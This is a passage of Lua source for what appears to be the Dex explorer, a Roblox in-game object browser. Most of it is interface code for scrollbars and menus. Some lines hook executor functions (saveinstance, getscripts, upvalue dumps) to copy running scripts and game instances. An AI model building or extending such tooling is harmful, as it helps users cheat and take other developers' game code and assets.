			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,GUI_SIZE)
				if ScrollThumbFrame.AbsoluteSize.x < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					if not UserInputService:IsMouseButtonPressed'MouseButton1' then
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollThumbFrame)
						drag_con:disconnect(); drag_con = nil
						up_con:disconnect(); drag = nil
					end
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					if not UserInputService:IsMouseButtonPressed'MouseButton1' then
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollThumbFrame)
						drag_con:disconnect(); drag_con = nil
						up_con:disconnect(); drag = nil
					end
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Explorer panel

local explorerPanel = D_E_X.ExplorerPanel
Create(explorerPanel,{
	BackgroundColor3 = GuiColor.Field;
	BorderColor3 = GuiColor.Border;
	Active = true;
})

local SettingsRemote = explorerPanel.Parent:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")
local GetApiRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetApi")
local GetAwaitRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetAwaiting")
local bindSetAwaiting = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("SetAwaiting")

local SaveInstanceWindow = explorerPanel.Parent:WaitForChild("SaveInstance")
local ConfirmationWindow = explorerPanel.Parent:WaitForChild("Confirmation")
local CautionWindow = explorerPanel.Parent:WaitForChild("Caution")
local TableCautionWindow = explorerPanel.Parent:WaitForChild("TableCaution")

local RemoteWindow = explorerPanel.Parent:WaitForChild("CallRemote")

local ScriptEditor = explorerPanel.Parent:WaitForChild("ScriptEditor")
local ScriptEditorEvent = ScriptEditor:WaitForChild("OpenScript")

local CurrentSaveInstanceWindow
local CurrentRemoteWindow

local lastSelectedNode

local DexStorage
local DexStorageMain
local DexStorageEnabled

if saveinstance then DexStorageEnabled = true end

if DexStorageEnabled then
	DexStorage = Instance.new("Folder")
	DexStorage.Name = "Dex"
	DexStorageMain = Instance.new("Folder", DexStorage)
	DexStorageMain.Name = "DexStorage"
end

local RunningScriptsStorage
local RunningScriptsStorageMain
local RunningScriptsStorageEnabled

if getscripts then RunningScriptsStorageEnabled = true end

if RunningScriptsStorageEnabled then
	RunningScriptsStorage = Instance.new("Folder")
	RunningScriptsStorage.Name = "Dex Internal Storage"
	RunningScriptsStorageMain = Instance.new("Folder", RunningScriptsStorage)
	RunningScriptsStorageMain.Name = "Running Scripts"
end

local UpvalueStorage
local UpvalueStorageVariables
local UpvalueStorageFunctions
local UpvalueStorageEnabled

if vars and funcs then UpvalueStorageEnabled = true end

if UpvalueStorageEnabled then
	UpvalueStorage = Instance.new('Folder')
	UpvalueStorage.Name = 'Upvalue Storage'
	UpvalueStorageVariables = Instance.new("Folder", UpvalueStorage)
	UpvalueStorageVariables.Name = "Upvalue Variables"
	UpvalueStorageFunctions = Instance.new("Folder", UpvalueStorage)
	UpvalueStorageFunctions.Name = "Upvalue Functions"
	for i, v in pairs(vars) do
		pcall(function()
			local n = Instance.new('StringValue', UpvalueStorageVariables)
			n.Name = tostring(i);
			n.Value = tostring(v);
		end)
	end
	for i, v in pairs(funcs) do
		pcall(function()
			local n = Instance.new('StringValue', UpvalueStorageFunctions)
			n.Name = tostring(i);
			n.Value = tostring(v);
		end)
	end
end

local listFrame = Create('Frame',{
	Name = "List";
	BackgroundTransparency = 1;
	ClipsDescendants = true;
	Position = UDim2.new(0,0,0,HEADER_SIZE);
	Size = UDim2.new(1,-GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-GUI_SIZE,0,HEADER_SIZE);
	Size = UDim2.new(0,GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = GUI_SIZE
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-GUI_SIZE);
	Size = UDim2.new(1,-GUI_SIZE,0,GUI_SIZE);
	Visible = false;
	Parent = explorerPanel;
})

local headerFrame = Create('Frame',{
	Name = "Header";
	BackgroundColor3 = GuiColor.Background;
	BorderColor3 = GuiColor.Border;
	Position = UDim2.new(0,0,0,0);
	Size = UDim2.new(1,0,0,HEADER_SIZE);
	Parent = explorerPanel;
	Create('TextLabel',{
		Text = "Explorer";
		BackgroundTransparency = 1;
		TextColor3 = GuiColor.Text;
		TextXAlignment = 'Left';
		Font = FONT;
		FontSize = FONT_SIZE;
		Position = UDim2.new(0,4,0,0);
		Size = UDim2.new(1,-4,0.5,0);
	});
})

local explorerFilter = 	Create('TextBox',{
	Text = "Filter Workspace";
	BackgroundTransparency = 0.8;
	TextColor3 = GuiColor.Text;
	TextXAlignment = 'Left';
	Font = FONT;
	FontSize = FONT_SIZE;
	Position = UDim2.new(0,4,0.5,0);
	Size = UDim2.new(1,-8,0.5,-2);
});
explorerFilter.Parent = headerFrame

SetZIndexOnChanged(explorerPanel)

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(32,32,32);
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Styles.Black;
	TextColorOver = Styles.White;
	TextLockedColor = CreateColor3(155,155,155);
	Height = 24;
	BorderColor = CreateColor3(216/4,216/4,216/4);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(32, 32, 32);
	BackgroundColorMouseover = CreateColor3(40, 40, 40);
	TitleMarginLeft = 15;
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(255,255,255);
	TextColorOver = Color3.new(1, 1, 1);
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 16;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(197, 28, 70);
	BorderColor = CreateColor3(45,45,45);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160/2,160/2,160/2);
	ArrowColorOver = Styles.Black;
}

local currentRightClickMenu
local CurrentInsertObjectWindow
local CurrentFunctionCallerWindow

local RbxApi

function ClassCanCreate(IName)
	local success,err = pcall(function() Instance.new(IName) end)
	if err then
		return false
	else
		return true
	end
end

function GetClasses()
	if RbxApi == nil then return {} end
	local classTable = {}
	for i,v in pairs(RbxApi.Classes) do
		if ClassCanCreate(v.Name) then
			table.insert(classTable,v.Name)
		end
	end
	return classTable
end

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function FunctionIsHidden(functionData)
	local tags = functionData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

local function GetAllFunctions(className)
	local class = RbxApi.Classes[className]
	local functions = {}
	
	if not class then return functions end
	
	while class do
		if class.Name == "Instance" then break end
		for _,nextFunction in pairs(class.Functions) do
			if not FunctionIsHidden(nextFunction) then
				table.insert(functions, nextFunction)
			end
		end
		class = RbxApi.Classes[class.Superclass]
	end
	
	sortAlphabetic(functions, "Name")

	return functions
end

function GetFunctions()
	if RbxApi == nil then return {} end
	local List = SelectionVar():Get()
	
	if #List == 0 then return end
	
	local MyObject = List[1]
	
	local functionTable = {}
	for i,v in pairs(GetAllFunctions(MyObject.ClassName)) do
		table.insert(functionTable,v)
	end
	return functionTable
end

function CreateInsertObjectMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game:GetService("Players").LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a < b end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
    local closeCon;
	local menu;
	local arrow;
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
            CurrentInsertObjectWindow.Visible = false
        end
        if closeCon then
            closeCon:Disconnect()
            closeCon = nil;
        end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,200,1,0)
		menu.CanvasSize = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end,1)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
        end
        
        local function isInGui(frame)
			local mloc = UserInputService:GetMouseLocation();
			local mouse = Vector2.new(mloc.X, mloc.Y - 36);
			
			local x1, x2 = frame.AbsolutePosition.X, frame.AbsolutePosition.X + frame.AbsoluteSize.X;
			local y1, y2 = frame.AbsolutePosition.Y, frame.AbsolutePosition.Y + frame.AbsoluteSize.Y;
		
			return (mouse.X >= x1 and mouse.X <= x2) and (mouse.Y >= y1 and mouse.Y <= y2)
		end

        closeCon = UserInputService.InputBegan:connect(function(m)
			if m.UserInputType == Enum.UserInputType.MouseButton1 then
				if menu and (not isInGui(menu)) then
					hideMenu()
				end
			end
		end)
	end


	showMenu()

	
	return frame
end

function CreateFunctionCallerMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game:GetService'Players'.LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a.Name < b.Name end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
			CurrentInsertObjectWindow.Visible = false
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,300,1,0)
		menu.CanvasSize = UDim2.new(0, 300, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
		
		local function GetParameters(functionData)
			local paraString = ""
			paraString = paraString.."("
			for i,v in pairs(functionData.Arguments) do
				paraString = paraString..v.Type.." "..v.Name
				if i < #functionData.Arguments then
					paraString = paraString..", "
				end
			end
			paraString = paraString..")"
			return paraString
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name.ReturnType.." "..name.Name..GetParameters(name), function()
				choice(name)
			end,2)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function CreateInsertObject()
	if not CurrentInsertObjectWindow then return end
	CurrentInsertObjectWindow.Visible = true
	if currentRightClickMenu and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset-2,0,0)
	end
	if CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Parent = explorerPanel.Parent
	end
end

function CreateFunctionCaller()
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow:Destroy()
		CurrentFunctionCallerWindow = nil
	end
	CurrentFunctionCallerWindow = CreateFunctionCallerMenu(
		GetFunctions(),
		"",
		false,
		function(option)
			CurrentFunctionCallerWindow:Destroy()
			CurrentFunctionCallerWindow = nil
			local list = SelectionVar():Get()
			for i = 1,#list do
				pcall(function() Instance.new(option,list[i]) end)
			end
			-- print(option.Name .. " selected to be called. Function caller being added soon, please wait!")
			--CallFunction()
			DestroyRightClick()
		end
	)
	if currentRightClickMenu and CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset*1.5-2,0,0)
	end
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Parent = explorerPanel.Parent
	end
end


function GetMouseLocation()
	return UserInputService:GetMouseLocation() - Vector2.new(0, 36);
end

function MouseHoveringOver(GuiObject)
	local MLocation = GetMouseLocation();

	return (MLocation.x >= GuiObject.AbsolutePosition.X and MLocation.x <= (GuiObject.AbsolutePosition.X + GuiObject.AbsoluteSize.X)) and (MLocation.y >= GuiObject.AbsolutePosition.Y and MLocation.y <= (GuiObject.AbsolutePosition.Y + GuiObject.AbsoluteSize.Y));
end

function CreateRightClickMenuItem(text, onClick, insObj)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	button.Transparency = 1
	if insObj == 1 then
		local newIcon = Icon(nil,ExplorerIndex[text] or 0)
		newIcon.Position = UDim2.new(0,0,0,2)
		newIcon.Size = UDim2.new(0,16,0,16)
		newIcon.IconMap.ZIndex = 5
		newIcon.Parent = button
		button.Text = "\t\t"..button.Text
	elseif insObj == 2 then
		button.FontSize = Enum.FontSize.Size11
	end

	--[[spawn(function()
		while button.Parent ~= nil and button.Parent.Parent ~= nil do
			game:service'RunService'.Stepped:wait();
			if not MouseHoveringOver(button) then
				button.TextColor3 = DropDown.TextColor
				button.BackgroundColor3 = DropDown.BackColor
			end
		end
	end)]]
	
    button.MouseEnter:connect(function()
        TweenService:Create(button, TweenInfo.new(0.1), {TextColor3 = DropDown.TextColorOver, BackgroundColor3 = DropDown.BackColorOver}):Play()
		if not insObj and CurrentInsertObjectWindow then
			if CurrentInsertObjectWindow.Visible == false and button.Text == "Insert Object" then
				CreateInsertObject()
			elseif CurrentInsertObjectWindow.Visible and button.Text ~= "Insert Object" then
				CurrentInsertObjectWindow.Visible = false
			end
		end
		if not insObj then
			if CurrentFunctionCallerWindow and button.Text ~= "Call Function" then
				CurrentFunctionCallerWindow:Destroy()
				CurrentFunctionCallerWindow = nil
			elseif button.Text == "Call Function" then
				CreateFunctionCaller()
			end
		end
	end)
    button.MouseLeave:connect(function()
        TweenService:Create(button, TweenInfo.new(0.1), {TextColor3 = DropDown.TextColor, BackgroundColor3 = DropDown.BackColor}):Play()
	end)
	button.MouseButton1Click:connect(function()
		TweenService:Create(button, TweenInfo.new(0.1), {TextColor3 = DropDown.TextColor, BackgroundColor3 = DropDown.BackColor}):Play()
		onClick(text)
	end)	
	return button
end

function CreateRightClickMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game:GetService'Players'.LocalPlayer:GetMouse()

	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	local closeCons;
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			frame:Destroy()
			DestroyRightClick()
        end
        if closeCons then
            closeCons:Disconnect()
            closeCons = nil;
        end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 5)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 16)
			option.Position = UDim2.new(0, 0, 0, (i-1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
            option.Parent = menu
            TweenService:Create(option, TweenInfo.new(0.1), {Transparency = 0.2}):Play()
        end
        local function isInGui(frame)
			local mloc = UserInputService:GetMouseLocation();
			local mouse = Vector2.new(mloc.X, mloc.Y - 36);
			
			local x1, x2 = frame.AbsolutePosition.X, frame.AbsolutePosition.X + frame.AbsoluteSize.X;
			local y1, y2 = frame.AbsolutePosition.Y, frame.AbsolutePosition.Y + frame.AbsoluteSize.Y;
		
			return (mouse.X >= x1 and mouse.X <= x2) and (mouse.Y >= y1 and mouse.Y <= y2)
		end

        closeCons = UserInputService.InputBegan:connect(function(m)
			if m.UserInputType == Enum.UserInputType.MouseButton1 then
				if menu and (not isInGui(menu)) then
					hideMenu()
				end
			end
		end)
	end


	showMenu()

	
	return frame
end

function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game:GetService'Players'.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

local clipboard = {}
local function delete(o)
	o.Parent = nil
end

local getTextWidth do
	local text = Create('TextLabel',{
		Name = "TextWidth";
		TextXAlignment = 'Left';
		TextYAlignment = 'Center';
		Font = FONT;
		FontSize = FONT_SIZE;
		Text = "";
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,1,0);
		Visible = false;
		Parent = explorerPanel;
	})
	function getTextWidth(s)
		text.Text = s
		return text.TextBounds.x
	end
end

local nameScanned = false
-- Holds the game tree converted to a list.
local TreeList = {}
-- Matches objects to their tree node representation.
local NodeLookup = {}

local nodeWidth = 0

local QuickButtons = {}

function filteringWorkspace()
	if explorerFilter.Text ~= "" and explorerFilter.Text ~= "Filter Workspace" then
		return true
	end
	return false
end

function lookForAName(obj,name)
	for i,v in pairs(obj:GetDescendants()) do
		if string.find(string.lower(v.Name),string.lower(name)) then nameScanned = true end
		-- lookForAName(v,name)
	end
end

function scanName(obj)
	nameScanned = false
	if string.find(string.lower(obj.Name),string.lower(explorerFilter.Text)) then
		nameScanned = true
	else
		lookForAName(obj,explorerFilter.Text)
	end
	return nameScanned
end

function updateActions()
	for i,v in pairs(QuickButtons) do
		v.Toggle(v.Cond());
	end
end

local updateList,rawUpdateList,updateScroll,rawUpdateSize do
	local function r(t)
		for i = 1,#t do
			if not filteringWorkspace() or scanName(t[i].Object) then
				TreeList[#TreeList+1] = t[i]

				local w = (t[i].Depth)*(2+ENTRY_PADDING+GUI_SIZE) + 2 + ENTRY_SIZE + 4 + getTextWidth(t[i].Object.Name) + 4
				if w > nodeWidth then
					nodeWidth = w
				end
				if t[i].Expanded or filteringWorkspace() then
					r(t[i])
				end
			end
		end
	end

	function rawUpdateSize()
